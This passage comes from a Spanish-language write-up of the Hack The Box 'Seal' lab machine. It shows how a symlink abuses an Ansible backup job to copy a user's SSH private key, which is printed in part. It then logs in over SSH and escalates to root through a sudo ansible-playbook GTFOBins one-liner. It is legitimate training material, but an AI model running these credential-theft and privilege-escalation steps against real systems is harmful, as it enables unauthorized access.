+    synchronize: src<span style="color:#f92672">=</span>/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest<span style="color:#f92672">=</span>/opt/backups/files copy_links<span style="color:#f92672">=</span>yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: <span style="color:#e6db74">&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+</code></pre></div><p>Podemos tratar de explotar la variable <em>copy_links=yes</em> para crear un enlace simbólico del directorio <em>.ssh</em>, del usuario <code>luis</code> en <em>/var/lib/tomcat9/webapps/ROOT/admin/dashboard</em>, ya que tenemos permisos de lectura y escritura ahí.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">tomcat@seal:/opt/backups/playbook$ ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
+
+tomcat@seal:/opt/backups/playbook$ cd /opt/backups/archives
+
+tomcat@seal:/opt/backups/archives$ ls -la
+total <span style="color:#ae81ff">604</span>
+drwxrwxr-x <span style="color:#ae81ff">2</span> luis luis   <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">16</span> 11:00 .
+drwxr-xr-x <span style="color:#ae81ff">4</span> luis luis   <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">16</span> 11:00 ..
+-rw-rw-r-- <span style="color:#ae81ff">1</span> luis luis <span style="color:#ae81ff">609577</span> Jul <span style="color:#ae81ff">16</span> 11:00 backup-2021-07-16-11:00:33.gz
+
+tomcat@seal:/opt/backups/archives$ cp back* /dev/shm
+
+tomcat@seal:/opt/backups/archives$ cd /dev/shm
+
+tomcat@seal:/dev/shm$ ls
+backup-2021-07-16-11:00:33.gz
+
+tomcat@seal:/dev/shm$ cp backup-2021-07-16-11:00:33.gz bak.gz
+
+tomcat@seal:/dev/shm$ gzip -d back.gz
+
+tomcat@seal:/dev/shm$ tar -xfv back
+
+tomcat@seal:/dev/shm$ cat dashboard/uploads/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG
+...snip...
+ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
+u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE<span style="color:#f92672">=</span>
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>Una vez conseguida la clave <em>id_rsa</em> de <code>luis</code>, nos la copiamos a nuestra máquina, le damos los permisos correctos y entramos por <em>SSH</em> con el usuario <code>luis</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ssh -i id_rsa luis@seal.htb
+Welcome to Ubuntu 20.04.2 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri <span style="color:#ae81ff">16</span> Jul <span style="color:#ae81ff">2021</span> 11:15:32 AM UTC
+
+  System load:           0.12
+  Usage of /:            46.5% of 9.58GB
+  Memory usage:          30%
+  Swap usage:            0%
+  Processes:             <span style="color:#ae81ff">175</span>
+  Users logged in:       <span style="color:#ae81ff">0</span>
+  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.10.10.250
+  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:feb9:5f36
+
+ * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!
+
+     https://microk8s.io/
+
+<span style="color:#ae81ff">0</span> updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+
+Last login: Fri May  <span style="color:#ae81ff">7</span> 07:00:18 <span style="color:#ae81ff">2021</span> from 10.10.14.2
+luis@seal:~$ cat user.txt
+6547e067f4549*********************
+</code></pre></div><h2 id="priv-esc">Priv. Esc.</h2>
+<h3 id="roottxt">root.txt</h3>
+<p>Mediante <code>sudo -l</code> podemos ver que nuestro usuario puede ejecutar <code>/usr/bin/ansible-playbook *</code> como <code>root</code> sin necesidad de contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luis@seal:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> luis on seal:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User luis may run the following commands on seal:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ansible-playbook *
+</code></pre></div><p>Con una simple búsqueda en <a href="https://gtfobins.github.io/gtfobins/ansible-playbook"target="_blank" rel="external nofollow noopener noreferrer">GTFOBins</a> encontramos cómo escalar a root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luis@seal:~$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
+luis@seal:~$ echo <span style="color:#e6db74">&#39;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#39;</span> &gt;$TF
+luis@seal:~$ sudo ansible-playbook $TF
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span>: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match <span style="color:#e6db74">&#39;all&#39;</span>
+
+PLAY <span style="color:#f92672">[</span>localhost<span style="color:#f92672">]</span> *****************************************************************************************************************************************************************************
+
+TASK <span style="color:#f92672">[</span>Gathering Facts<span style="color:#f92672">]</span> ***********************************************************************************************************************************************************************
+ok: <span style="color:#f92672">[</span>localhost<span style="color:#f92672">]</span>
+
+TASK <span style="color:#f92672">[</span>shell<span style="color:#f92672">]</span> *********************************************************************************************************************************************************************************
+<span style="color:#75715e"># /bin/bash</span>
+root@seal:/tmp# hostname <span style="color:#f92672">&amp;&amp;</span> cat /root/root.txt
+seal
+047cb40c01dc**********************
+</code></pre></div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2021-11-03 15:39:08">Updated on 2021-11-03&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/seal-htb/seal-htb/" data-title="Seal HTB Writeup" data-via="jagelit0" data-hashtags="linux,writeup,medium"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/seal-htb/seal-htb/" data-hashtag="linux"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/seal-htb/seal-htb/" data-title="Seal HTB Writeup" data-image="../assets/posts/seal/info_card.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/linux/' class="post-tag">linux</a><a href='/tags/writeup/' class="post-tag">writeup</a><a href='/tags/medium/' class="post-tag">medium</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/zeno-thm/zeno-thm/" class="post-nav-item" rel="prev" title="Zeno THM Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Zeno THM Writeup</a>
+      <a href="/posts/local-shellcode-storage/local-shellcode-storage/" class="post-nav-item" rel="next" title="Maldev 101 - Local Shellcode Storage">Maldev 101 - Local Shellcode Storage<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e rottenbytes"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
